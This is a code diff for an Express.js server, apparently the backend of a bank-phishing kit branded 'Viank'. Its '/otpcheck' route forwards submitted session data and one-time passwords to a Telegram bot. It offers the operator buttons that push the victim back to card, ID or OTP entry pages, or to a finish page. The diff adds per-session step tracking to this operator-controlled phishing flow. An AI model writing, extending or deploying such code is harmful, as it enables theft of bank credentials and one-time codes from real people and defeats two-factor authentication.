@@ -132,11 +132,16 @@ app.post('/idcheck', async (req, res) => {
   }
 });
 
-// ✅ Ruta para otp-check.html
 app.post('/otpcheck', async (req, res) => {
   try {
     const data = req.body;
     const sessionId = data.sessionId;
+
+    // Guardar el paso para su uso posterior
+    redirectionTable[sessionId] = {
+      target: null,
+      step: data.step || 'otp-check'
+    };
 
     const text = `
 🟣Viank🟣 - |[otp-check]|
@@ -153,8 +158,10 @@ app.post('/otpcheck', async (req, res) => {
 🆔 sessionId: ${sessionId}
 ---`.trim();
 
-    const reply_markup = {
-      inline_keyboard: [
+    let reply_markup = { inline_keyboard: [] };
+
+    if (data.step === 'otp-check') {
+      reply_markup.inline_keyboard = [
         [
           { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
           { text: '⚠️ Error Logo',   callback_data: `go:id-check.html|${sessionId}` }
@@ -163,8 +170,16 @@ app.post('/otpcheck', async (req, res) => {
           { text: '🔁 Error OTP',     callback_data: `go:otp-check2.html|${sessionId}` },
           { text: '✅ Finalizar',     callback_data: `go:finish.html|${sessionId}` }
         ]
-      ]
-    };
+      ];
+    } else {
+      reply_markup.inline_keyboard = [
+        [
+          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
+          { text: '⚠️ Error Logo',   callback_data: `go:id-check.html|${sessionId}` },
+          { text: '⏭️ Siguiente',     callback_data: `go:otp-check.html|${sessionId}` }
+        ]
+      ];
+    }
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -178,6 +193,7 @@ app.post('/otpcheck', async (req, res) => {
     res.status(500).send({ ok: false, error: 'telegram_send_failed' });
   }
 });
+
 
 
 // ✅ Webhook de Telegram para botones dinámicos
